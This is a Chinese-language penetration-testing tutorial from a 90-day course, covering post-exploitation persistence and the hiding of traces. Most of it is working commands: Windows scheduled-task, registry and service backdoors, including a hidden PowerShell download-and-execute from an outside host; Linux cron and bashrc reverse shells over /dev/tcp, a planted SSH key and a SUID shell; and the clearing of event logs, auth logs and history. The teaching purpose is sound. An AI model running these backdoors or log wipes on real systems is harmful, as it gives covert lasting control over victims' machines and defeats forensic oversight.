---
title: Day072：内网渗透 - 后渗透与权限维持
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: f2ea9
date: 2026-01-28
updated: 2026-01-28
---

# Day072：内网渗透 - 后渗透与权限维持

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | 后渗透与权限维持 |
| **预计时间** | 3-4 小时 |
| **难度等级** | ⭐⭐⭐⭐ 中高级 |

---

## 🔥 今日痛点场景

> **场景**：你辛苦拿下了目标机器，但一重启就没了。或者目标改了密码，你的访问权限就失效了。
>
> **问题**：如何在目标系统上建立持久访问，即使重启或改密码也能继续控制？
>
> **今天的任务**：学习各种权限维持技术，建立持久化后门。

---

## 🎯 今日目标

- [ ] 掌握 Windows 权限维持技术
- [ ] 掌握 Linux 权限维持技术
- [ ] 了解域环境持久化
- [ ] 学会隐藏攻击痕迹

**闯关条件**：在目标系统上建立至少两种持久化后门。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：Windows 计划任务后门（30 分钟）

```cmd
:: 创建计划任务（每次登录执行）
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

:: 创建计划任务（每小时执行）
schtasks /create /tn "SystemCheck" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/shell.ps1')" /sc hourly /ru SYSTEM

:: 查看计划任务
schtasks /query /tn "WindowsUpdate"

:: 删除计划任务
schtasks /delete /tn "WindowsUpdate" /f
```

---

### 任务 2：Windows 注册表后门（30 分钟）

**Run 键自启动**：

```cmd
:: 当前用户启动
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

:: 所有用户启动（需要管理员）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

**其他自启动位置**：

```cmd
:: RunOnce（只执行一次）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\backdoor.exe" /f

:: 用户登录脚本
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\backdoor.bat" /f
```

---

### 任务 3：Windows 服务后门（30 分钟）

```cmd
:: 创建服务
sc create "WindowsHelper" binPath= "C:\Windows\Temp\backdoor.exe" start= auto

:: 启动服务
sc start WindowsHelper

:: 查看服务
sc query WindowsHelper

:: 删除服务
sc delete WindowsHelper
```

---

### 任务 4：Linux 权限维持（40 分钟）

**SSH 公钥后门**：

```bash
# 生成密钥
ssh-keygen -t rsa -N "" -f /tmp/backdoor_key

# 添加公钥到目标
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys

# 使用私钥登录
ssh -i /tmp/backdoor_key root@target
```

**Crontab 后门**：

```bash
# 每分钟反弹 shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" | crontab -

# 查看 crontab
crontab -l
```

**bashrc 后门**：

```bash
# 用户登录时执行
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> /root/.bashrc
```

**SUID 后门**：

```bash
# 复制 bash 并设置 SUID
cp /bin/bash /tmp/.backdoor
chmod u+s /tmp/.backdoor

# 使用
/tmp/.backdoor -p
```

---

### 任务 5：隐藏痕迹（30 分钟）

**Windows**：

```cmd
:: 清除事件日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

:: 隐藏文件
attrib +h +s C:\Windows\Temp\backdoor.exe

:: 修改时间戳
powershell (Get-Item C:\backdoor.exe).LastWriteTime = "2020-01-01 12:00:00"
```

**Linux**：

```bash
# 清除历史
history -c
echo "" > ~/.bash_history
unset HISTFILE

# 清除日志
echo "" > /var/log/auth.log
echo "" > /var/log/wtmp
echo "" > /var/log/lastlog

# 隐藏文件
mv backdoor .hidden_backdoor
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| 计划任务后门成功 | ⬜ |
| 注册表后门成功 | ⬜ |
| 服务后门成功 | ⬜ |
| Linux 后门成功 | ⬜ |
| 痕迹清理完成 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### Windows 持久化方法总结

| 方法 | 权限要求 | 隐蔽性 | 稳定性 |
|------|----------|--------|--------|
| 计划任务 | 管理员 | 中 | 高 |
| 注册表 Run | 用户/管理员 | 低 | 中 |
| 服务 | 管理员 | 中 | 高 |
| WMI 订阅 | 管理员 | 高 | 高 |
| DLL 劫持 | 用户 | 高 | 中 |

### Linux 持久化方法总结

| 方法 | 权限要求 | 隐蔽性 |
|------|----------|--------|
| SSH 公钥 | root | 中 |
| Crontab | 用户 | 低 |
| bashrc | 用户 | 低 |
| SUID | root | 中 |
| Rootkit | root | 高 |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| AV 检测 | 后门被删 | 使用免杀技术 |
| 权限不足 | 无法写入 | 换其他位置或方法 |
| 重启失效 | 后门消失 | 确认持久化机制正确 |

---

## 💡 知识卡片速查

### 快速持久化命令

| 系统 | 方法 | 命令 |
|------|------|------|
| Windows | 计划任务 | `schtasks /create ...` |
| Windows | 注册表 | `reg add HKCU\...\Run ...` |
| Linux | SSH | `echo key >> authorized_keys` |
| Linux | Cron | `crontab -e` |

---

## 🚀 明日预告

**Day 073：内网渗透 - 痕迹清理与反取证**

明天你将：
- 深入学习日志清理技术
- 了解反取证技术
- 学习如何不留痕迹

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> 持久化是渗透测试的重要环节。没有持久化，前面的工作白费。
>
> 但记住：实际渗透测试中，后门和痕迹清理都要在报告中说明，并在结束后清理干净。
>
> 这些技术用于学习和授权测试，不要用于非法用途。

```bash
echo "Day 072 Complete! 权限维持技术掌握！"
```
